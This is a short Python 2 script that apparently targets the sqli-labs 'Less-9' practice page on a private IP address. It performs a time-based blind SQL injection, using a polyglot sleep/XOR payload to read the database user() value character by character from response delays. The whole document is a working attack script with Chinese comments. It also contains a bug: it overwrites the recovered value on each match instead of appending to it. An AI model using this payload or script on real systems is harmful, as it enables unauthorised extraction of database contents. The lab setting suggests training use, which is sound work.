#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
import time

payloads = 'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'    #匹配用的字符串

user=''
print 'Start to retrive current user:'
for i in range(1,23):
        for payload in payloads:    #遍历取出字符
                startTime=time.time()
                url = """http://192.168.116.145/sqli//Less-9/?id=1-if(now()<sysdate(),sleep(0),0)/*'XOR(if(ascii(substring(user(),"""+str(i)+""",1))="""+str(ord(payload))+""",sleep(20),0))OR'"XOR(if(now()=sysdate(),sleep(0),0))OR"*/"""
                response=requests.get(url, timeout=30)
                if time.time() - startTime > 15:
                        user =payload
                        print 'user is:', user
                        break
print '\n[Done] current user is %s' % user